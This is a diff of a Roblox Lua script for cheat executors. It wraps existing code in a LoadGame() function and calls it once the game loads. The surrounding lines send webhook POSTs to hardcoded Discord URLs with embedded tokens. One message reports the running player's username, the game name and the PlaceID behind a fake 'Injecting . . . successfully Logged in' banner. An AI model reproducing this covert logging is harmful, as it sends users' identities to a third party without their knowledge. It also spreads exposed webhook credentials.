@@ -1591,7 +1591,8 @@ _G.SendWebHook("https://discord.com/api/webhooks/998558679790002276/-kgc-yS5MZoJ
 
 
 
-
+function LoadGame()
+	repeat wait() until game:IsLoaded()
 function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
     waitt()
 	_G.SendWebHook("https://discord.com/api/webhooks/1001371210074042461/TnlW2ECFmM402HH_oLZT4Ux-tDhMjBnou48CjtR6oY72DNUFgBouRZAdrngqsQwR_z6v", "https://cdn.discordapp.com/attachments/998558647019913236/1005357754162090004/photo_62588edb73be46e64eb93606-1659737825622.png")
@@ -1604,6 +1605,7 @@ function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}
 	function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
 	waitt()
 	_G.SendWebHook("https://discord.com/api/webhooks/1001371210074042461/TnlW2ECFmM402HH_oLZT4Ux-tDhMjBnou48CjtR6oY72DNUFgBouRZAdrngqsQwR_z6v", "-- /// Injecting . . .")
+
 
 	waitt()
 _G.SendWebHook("https://discord.com/api/webhooks/1001371210074042461/TnlW2ECFmM402HH_oLZT4Ux-tDhMjBnou48CjtR6oY72DNUFgBouRZAdrngqsQwR_z6v", "```User: "..Player.name.." \nGame: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." \nPlaceID: "..game.PlaceId.." \n \nLoading: . \nLoading: . . \nLoading: . . . \nSuccess: successfully Logged in```")
@@ -1642,9 +1644,10 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+end
 
 
-
+LoadGame()
 
 
 
